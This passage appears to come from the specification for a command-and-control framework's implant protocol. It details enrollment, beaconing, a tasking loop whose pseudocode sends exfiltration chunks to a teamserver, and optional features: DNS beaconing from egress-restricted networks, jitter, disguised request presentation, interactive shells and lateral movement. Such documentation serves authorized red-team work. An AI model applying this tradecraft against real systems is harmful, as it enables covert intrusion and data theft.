tasking too: it is not the shape you agreed to. Report each refusal as the
task's `Failed` result so the attack surfaces on the task. A server that does
not echo the arm keeps the four-element shape, and an implant that never
advertises keeps receiving it -- the addition is negotiated, never imposed.

## Tier 0 -- Interop (required)

The smallest implant that enrolls, contacts, and executes tasking:

1. **Enroll.** Generate an ECDSA P-256 key pair. POST the public key with the
   deploy token. Receive the ids, the leaf, and the CA chain. Keep the private
   key; never transmit it.
2. **Beacon.** POST the envelope route (`/implants/beacon`, above): the
   default build bakes a per-artifact key, and every contact body seals
   under it covering a fresh counter (a lab build with protection off sends
   the plaintext frames, on the cleartext front only).
3. **Handshake.** Send the `HandshakeRequest` first; require OK; treat every
   other status as permanent.
4. **Task loop.** Parse each downstream `TaskRequest`, execute its verb
   against its opaque argument string, and write a `TaskResult` echoing the
   task id. The verb grammar belongs to the implant's own handlers; the server
   gates verbs, it does not parse arguments.

In pseudocode, the whole obligation:

```
key    = ecdsa_p256()
enroll = post_json("https://teamserver/implants/enroll",
                   {"deployTokenSecret": token,
                    "publicKey": b64(key.spki_der)})
cas    = [cert(b) for b in enroll.caChain]

forever:
    # One HTTP(S) POST to /implants/beacon per cycle: the frames sealed
    # (counter || frames) under the baked key, the response opened the
    # same way.
    body = seal(counter++ || frames(HandshakeRequest{1, 0, enroll.implantId, my_verbs}))
    answer = post("https://teamserver/implants/beacon", body)
    frames = open(answer)
    if HandshakeResponse.parse(recv()).status != OK: exit

    while task = TaskRequest.parse(next_downstream_frame()):
        if not verify_tasking(cas, task, my_id = enroll.implantId):
            send Frame(TASK_RESULT, TaskResult{task.id, Failed, "rejected"}); continue
        outcome, output, chunks = my_handlers[task.verb](task.arguments)
        send Frame(TASK_RESULT, TaskResult{task.id, outcome, output})
        for c in chunks: send Frame(EXFIL_CHUNK, c)

    # stream mode: the while loop blocks on the next downstream frame.
    # poll mode: after a short idle with no frame, close the stream,
    # sleep(baked_sleep +/- baked_jitter/2), and reconnect.
```

An implant that stops here interoperates fully: it appears on the roster, is
taskable, and its results and audit trail are indistinguishable from the
reference implant's.

## Tier 1 -- Hardening (the implant author's choice)

Each item hardens the implant with no server-side counterpart requirement --
the server cannot observe whether an implant adopted any of them:

- **Tasking signature verification.** As specified above. Skipping it leaves
  the implant trusting the channel (the pre-signing posture,
  architecture.md Sec 9).
- **Replay nonces.** The negotiated arm above: advertise at the handshake,
  verify the five-element tuple, and refuse any nonce at or below your
  accepted floor, so a captured frame replayed to this implant is refused and
  the refusal surfaces on the task. The reference implant always advertises;
  skipping the arm leaves replay protection to the channel.
- **Kill date.** Refuse to start past the baked kill date and re-check it
  each cycle. The teamserver refuses handshakes past it regardless; the local
  check bounds a lost implant that can no longer reach any server.
- **Beacon discipline.** The baked sleep with jitter, and exponential backoff
  on consecutive failures, so a down teamserver is not polled at beacon rate.
  The contact mode is the implant's choice on the same stream contract.
- **Egress fallback walk.** The baked profile may carry an ordered endpoint
  list -- a primary plus fallbacks (`fallbackEnrollURLs` in the baked JSON,
  `[]` when the build names none). Walk it on failure: advance to the next
  entry when an enroll attempt or a contact cycle fails without a handshake,
  and wrap to the primary so a front that returns is picked up again. The walk
  is client-side only -- the frame grammar never changes -- and the leaf stays
  the same whichever entry answers, so the server sees one identity
  (architecture.md Sec 8).

## Tier 2 -- Optional features

Adopt per deployment need; absence degrades the feature, not interop:

- **Exfil chunking** -- `ExfilChunk` frames stream bulk data into the
  artifact store.
- **Staged uploads** -- the `StagedPull`/`StagedChunk` demand path streams a
  staged task's bulk payload downstream (architecture.md Sec 10, the
  per-verb typed arm). An implant without it still receives staged tasks;
  it ignores the unknown `staged_bytes` field and fails the verb on its own
  argument grammar, and no chunk frame ever arrives unasked.
- **Interactive channels** -- the `shell.interact` streaming shape above
  (architecture.md Sec 10.3): `ChannelOutput` upstream, `ChannelInput`
  downstream, one final `TaskResult`. An implant without it reports
  `shell.interact` Failed on its own grammar ("unknown verb" or a one-shot
  refusal), and the server never routes a `ChannelInput` to an implant that
  did not advertise the verb.
- **Receive acks** -- the dispatch strand above (architecture.md Sec 10.3):
  the `task_acks` handshake advertisement and the `TaskAck` frame. An
  implant without it never advertises, never acks, and keeps today's
  dispatch semantics exactly -- a written frame counts as delivered.
- **DNS contacts** -- the TXT-query grammar above, for egress-restricted
  targets where only DNS leaves the network. Absence is graceful: an implant
  without it simply beacons over the stream transports. The reference
  implant carries the client: a `dns://` entry in its baked egress walk
  runs it, a build with no
  dns-schemed entry compiles without it.
- **Malleable enroll presentation** -- the baked URI path, User-Agent,
  headers, timeout, and base64 body envelope shape the enroll request a
  build unit renders them into. The bake carries the `userAgent` and
  `headers` keys for implants that honor them (a community implant's
  presentation surface); the reference Rust implant applies the path,
  timeout, and envelope shape only -- its HTTP agent sets no custom
  User-Agent or headers.
- **Child derivation** -- the parent-naming enroll flow behind
  `lateral.move` (architecture.md Sec 5.2).
- **Plugin modules** -- the `module.load` / `module.list` /
  `module.unload` family (architecture.md Sec 5.4): staged task content
  carrying a module's bytes, the loader registering its verbs for later
  dispatch. The wire shape and the loader's rules live in
  [tradecraft.md](tradecraft.md); an implant without the family reports
  the verbs unknown and nothing else changes.

## Evolution rules

These rules bind every future protocol change; they are what keeps Tier 0
from quietly growing:

1. **Additive only.** New fields take new field numbers; numbers are never
   reused or repurposed. Unknown fields and enum values are ignored, never
   errors. A newer server must serve a Tier 0 implant unchanged.
2. **No new mandatory work on the task path.** A protocol addition that
   would require every implant to implement new cryptography or new
   processing to keep interoperating must instead be negotiated (a handshake
   capability) with a fallback to the existing shape, or it does not ship.
3. **Every addition lands in a tier.** A change to this file accompanies any
   change to rod.proto: the change states its tier and what a Tier 0 implant
   does about it (the usual answer: nothing). The staged-upload arm
   (`TaskRequest.staged_bytes`, `StagedPull`, `StagedChunk`) is the worked
   example: Tier 2, negotiated implicitly by demand -- a Tier 0 implant
   ignores the unknown field, never receives a chunk frame, and fails the
   verb on its own grammar. The fronting arm
   (`TaskRequest.target_implant_id`) follows the same rule: Tier 2, present
   only on frames a server fronts to a fronting-capable implant -- every
   other implant never sees the field at all.
4. **Weight stays server-side.** Capability reach grows in the teamserver,
   the tradecraft modules, and the build pipeline -- not in the minimum an
   implant must carry (architecture.md Sec 14).

## Conformance harness

The Tier 0 contract is executable, not just documented: the conformance
harness (`tests/teamserver/Rod.Conformance.Tests/`) drives a candidate
implant against a live teamserver and reports pass/fail per clause --
`enroll.public-key-and-token`, `handshake.first-frame-ok`, `task.round-trip`,
`chunk.discipline`, `signature.verification` (against a hostile tasking probe
that feeds unsigned, wrongly signed, cross-implant, and correctly signed
control tasks), and `kill-date.refusal`. Pointing it at the reference implant
passes every clause; pointing it at a deliberately broken one fails with the
violated clause named. A community implant author reproduces the shape:
implement `IImplantCandidate` (a process or an in-process loop) and hand it
to `ConformanceRig.RunAsync` -- the rig's own `MinimalImplant` is a worked
Tier 0/Tier 1 example with switchable defects.

## Calibration note

Tier 0 needs only an HTTP client, a protobuf codec, and AES-256-GCM: the
rod.v1 frames carried as delimited sequences in ordinary HTTP
request/response bodies, one POST per poll contact. Authentication lives
at the application layer: the build bakes a per-artifact key, every
contact body seals under it covering a fresh counter, and no transport
requests a TLS client certificate anywhere -- the cleartext `http`
posture carries confidential content. The held connections (the WebSocket
beacon on a web front, the socket family's live mode) remain the
interactive shape -- server-push tasking the moment it is queued, and the
live channels -- so an implant that wants `shell.interact` upgrades to a
WebSocket client; an implant that only polls never opens one.

The reference Rust implant runs exactly this cut: an artifact built
against an `http`/`https` front contacts over the
envelope POST cycle on that front's own port (the mainstream single-port
web shape; a stream-mode build holds the WebSocket beacon on the same
front), and the socket or datagram dials carry their own sections above
-- the wire contract this document describes is the one the reference
implant itself runs on every family.
